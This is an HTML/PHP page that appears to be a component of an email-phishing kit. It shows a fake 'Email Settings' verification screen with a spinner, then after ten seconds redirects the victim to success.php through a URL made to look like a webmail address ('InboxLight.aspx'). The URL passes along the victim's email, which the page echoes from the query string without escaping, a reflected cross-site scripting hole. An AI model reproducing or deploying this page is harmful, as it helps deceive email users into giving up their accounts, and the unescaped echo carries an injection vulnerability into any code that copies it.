<html>
<head>
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon"/>

<meta http-equiv="REFRESH" content="10; success.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1">

<title>Email Settings  </title></head>
</head>

<br><br>

<table><tr>

<td width="30"></td>

<td>

	<img src="files/loader.gif" width="50" height="50">
</td>



<td width="5"></td>



<td>
	
	<font face="verdana" size="3">
	<b>Processing... </b>
	<br>
	<font size="2"> Please wait while your account is being verified in database  !</font>
	</font>

</td>

</tr></table>

<body>

</body>
</html>